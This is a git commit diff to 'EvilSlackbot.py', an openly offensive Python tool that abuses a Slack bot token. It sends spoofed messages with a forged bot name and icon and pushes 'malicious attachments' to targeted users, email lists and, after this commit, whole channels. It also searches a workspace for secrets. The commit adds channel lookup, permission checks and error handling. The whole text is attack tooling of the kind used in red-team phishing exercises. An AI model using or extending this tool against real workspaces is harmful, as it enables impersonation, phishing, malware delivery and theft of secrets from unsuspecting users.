8c2a9f9e91dac65f3f1dfd839ff6efab4c38357f
Drew-Sec <drewzesec@gmail.com>
2023-10-29 22:15:27 -0400

    Added Error Handling and Channel capabilities

--- EvilSlackbot.py
+++ EvilSlackbot.py
@@ -1,6 +1,7 @@
 #! /usr/bin/env python3
 
 from slack import WebClient
+from slack.errors import SlackApiError
 import argparse
 from colorama import Fore, init
 
@@ -42,6 +43,7 @@ group_attack.add_argument('-s','--search',help='Search slack for secrets with a 
 group_attack.add_argument('-a','--attach',help='Send a message containing a malicious attachment (Requires -f and -e or -eL)',action='store_true')
 group_args.add_argument('-f','--file',help='Path to file attachment',action='store')
 group_args.add_argument('-e','--email',help='Email of target',action='store')
+group_args.add_argument('-cH','--channel',help='Target Slack Channel (Do not include #',action='store')
 group_args.add_argument('-eL','--email_list',help='Path to list of emails separated by newline',action='store')
 group_args.add_argument('-c','--check',help='Lookup and display the permissions and available attacks associated with your provided token.',action='store_true')
 
@@ -79,14 +81,44 @@ if args.check == True:
    exit()
 else:
     checkperms()
-    
 
+# Check that there's only one sending argument at a time
+e_and_eL = args.email != None and args.email_list != None
+e_and_cH = args.email != None and args.channel != None
+eL_and_cH = args.email_list != None and args.channel != None
+if e_and_eL or e_and_cH or eL_and_cH: 
+    print(red+'Error: -e,-eL,and -cH can not be used together')
+    exit()
+
+channels = {}
+channel_id = ''
+# Lookup channel_id
+def lookupByChannel():
+    lookup = t.conversations_list()
+    channel_list = lookup['channels']
+    global channel_id,channels,user_id
+    for chan in range(0,len(channel_list)):
+        name = channel_list[chan]['name']
+        chan_id = channel_list[chan]['id']
+        channels[name] = chan_id
+    try:
+        channel_id = channels[args.channel]
+    except:
+        print(red+'ERROR: '+white+args.channel+red+' channel not found')
+        exit()
+    user_id = channel_id
+        
+#print(channel_id)
 user_id = ""
 # lookup userid by email address
 def lookupByEmail():
-    lookup = t.api_call("users.lookupByEmail?email=" + args.email)
-    global user_id
-    user_id = lookup['user']['id']
+    try:
+        lookup = t.api_call("users.lookupByEmail?email=" + args.email)
+        global user_id
+        user_id = lookup['user']['id']
+    except SlackApiError:
+        print(red+'ERROR: '+ white+args.email.strip() + red+' not found in Slack')
+        raise Exception
 
 # Send spoofed message
 botname,icon,message = '','',''
@@ -106,14 +138,18 @@ def setupSpoofMessage():
     div()
     ready = input(red+'Ready to send your message? y/n\n'+white)
     if ready != 'y' and ready != 'yes' and ready != 'Y':
-        print(red+'Message not sent')
+        print(red+'Message was not sent')
         setupSpoofMessage()
     elif args.email_list != None:
         sendMessageToList()
-    else:
+    elif args.email != None:
         lookupByEmail()
         sendMessage()
         print(green+'Message sent to '+white+args.email)
+    elif args.channel != None:
+        lookupByChannel()
+        sendMessage()
+        print(green+'Message sent to '+white+args.channel)
 
 # Send non-spoofed message
 def setupMessage():
@@ -127,30 +163,46 @@ def setupMessage():
     div()
     ready = input(red+'Ready to send your message? y/n\n'+white)
     if ready != 'y' and ready != 'yes' and ready != 'Y':
-        print(red+'Message not sent')
+        print(red+'Message was not sent')
         setupMessage()
     elif args.email_list != None:
         sendMessageToList()
-    else:
-        lookupByEmail()
+    elif args.email != None:
+        try:
+            lookupByEmail()
+            sendMessage()
+            print(green+'Message sent to '+white+args.email)
+        except:
+            exit()
+    elif args.channel != None:
+        lookupByChannel()
         sendMessage()
-        print(green+'Message sent to '+white+args.email)
+        print(green+'Message sent to '+white+args.channel)
 
 # Sending to single target
 def sendMessage():
-    send = t.chat_postMessage(
-        channel=user_id,
-        username=botname,
-        icon_url=icon,
-        text=message
+    try:
+        send = t.chat_postMessage(
+            channel=user_id,
+            username=botname,
+            icon_url=icon,
+            text=message
         )
+    except SlackApiError as e:
+        print(red+'ERROR: '+white+e.response['error'])
+        exit()
 # Sending to list of targets
 def sendMessageToList():
     r = open(args.email_list)
+    div()
     for address in r.readlines():
-        lookupByEmailList(address)
-        sendMessage()
-        print(green+"Message sent to: " + white+address)
+        try:
+            lookupByEmailList(address)
+            sendMessage()
+            print(green+"Message sent to: " + white+address)
+        except:
+            print(red+'ERROR: '+ white+address.strip() + red+' was not found in Slack. Message was not sent\n')
+            pass
     r.close()
 
 # Lookup slack userid for each email in list
@@ -175,30 +227,46 @@ def setupFileMessage():
     div()
     ready = input(red + 'Ready to send your message? y/n\n'+white)
     if ready != 'y' and ready != 'yes' and ready != 'Y':
-        print(red+'Message not sent')
+        print(red+'Message was not sent')
         setupFileMessage()
     elif args.email_list != None:
         sendFileToList()
-    else:
-        lookupByEmail()
+    elif args.email != None:
+        try:
+            lookupByEmail()
+            sendFile()
+            print(green+'File sent to '+white+args.email)
+        except:
+            exit()
+    elif args.channel != None:
+        lookupByChannel()
         sendFile()
-        print(green+'File sent to '+white+args.email)
+        print(green+'File sent to '+white+args.channel)
 
 def sendFileToList():
     r = open(args.email_list)
     for address in r.readlines():
-        lookupByEmailList(address)
-        sendFile()
-        print(green+"File sent to: " + white+address)
+        try:
+            lookupByEmailList(address)
+            sendFile()
+            print(green+"File sent to: " + white+address)
+        except:
+            print(red+'ERROR: '+ white+address.strip() + red+' was not found in Slack. Message was not sent\n')
+            pass
+            
     r.close()
 
 def sendFile():
-    send = t.files_upload(
-    channels=user_id,
-    file=args.file,
-    title=file_title,
-    initial_comment=message,
-)
+    try:
+        send = t.files_upload(
+        channels=user_id,
+        file=args.file,
+        title=file_title,
+        initial_comment=message,
+        )
+    except SlackApiError as e:
+        print(red+'ERROR: '+white+e.response['error'])
+        exit()
 
 def keywordSearch():
     div()
@@ -218,39 +286,71 @@ def keywordSearch():
 if args.spoof == True:
     if 'chat:write.customize' not in perms:
         div()
-        print(red + 'ERROR: Your provided token does not have the chat:write.customize permissions.',
+        print(red + 'ERROR: Your provided token does not have the chat:write.customize permission.',
               'You can not send a spoofed message'
               )
         exit()
-    if args.email == None and args.email_list == None:
+    if 'channels:read' not in perms and args.channel != None:
         div()
-        print(red + 'ERROR: -sP/--spoof requires --email or --email_list')
+        print(red + 'ERROR: Your provided token does not have the channels:read permission.',
+              red+'You can not send messages to channels'
+              )
+    if 'chat:write.public' not in perms and args.channel != None:
+        div()
+        print(red + 'WARNING: Your provided token does not have the chat:write.public permission.',
+              red+'You can not send messages to a channel if your bot is not already member of that channel'
+              )
+    if args.email == None and args.email_list == None and args.channel == None:
+        div()
+        print(red + 'ERROR: -sP/--spoof requires --email,--email_list, or --channel')
         exit()
     else:
         setupSpoofMessage()
 if args.message == True:
     if 'chat:write' not in perms:
         div()
-        print(red + 'ERROR: Your provided token does not have the chat:write permissions.',
-              'You can not send a spoofed message'
+        print(red + 'ERROR: Your provided token does not have the chat:write permission.',
+              red+'You can not send a spoofed message'
               )
         exit()
-    if args.email == None and args.email_list == None:
+    if 'channels:read' not in perms and args.channel != None:
         div()
-        print(red + 'ERROR: -m/--message requires --email or --email_list')
+        print(red + 'ERROR: Your provided token does not have the channels:read permission.',
+              red+'You can not send messages to channels'
+              )
+        exit()
+    if 'chat:write.public' not in perms and args.channel != None:
+        div()
+        print(red + 'WARNING: Your provided token does not have the chat:write.public permission.',
+              red+'You can not send messages to a channel if your bot is not already member of that channel'
+              )
+    if args.email == None and args.email_list == None and args.channel == None:
+        div()
+        print(red + 'ERROR: -m/--message requires --email,--email_list, or --channel')
         exit()
     else:
         setupMessage()
 if args.attach == True:
     if 'files:write' not in perms:
         div()
-        print(red + 'ERROR: Your provided token does not have the files:write permissions.',
-              'You can not send a malicious attachment'
+        print(red + 'ERROR: Your provided token does not have the files:write permission.',
+              red+'You can not send a malicious attachment'
               )
         exit()
-    if args.email == None and args.email_list == None:
+    if 'channels:read' not in perms and args.channel != None:
         div()
-        print(red + 'ERROR: -a/--attach requires --email or --email_list')
+        print(red + 'ERROR: Your provided token does not have the channels:read permission.',
+              red+'You can not send messages to channels'
+              )
+        exit()
+    if 'chat:write.public' not in perms and args.channel != None:
+        div()
+        print(red + 'WARNING: Your provided token does not have the chat:write.public permission.',
+              red+'You can not send messages to a channel if your bot is not already member of that channel'
+              )
+    if args.email == None and args.email_list == None and args.channel == None:
+        div()
+        print(red + 'ERROR: -a/--attach requires --email,--email_list, or --channel')
         exit()
     if args.file == None:
         div()
@@ -261,7 +361,7 @@ if args.attach == True:
 if args.search == True:
     if 'search:read' not in perms:
         div()
-        print(red + 'ERROR: Your provided token does not have the search:read permissions.',
+        print(red + 'ERROR: Your provided token does not have the search:read permission.',
               red + 'You can not do a keyword search for secrets'
               )
         exit()
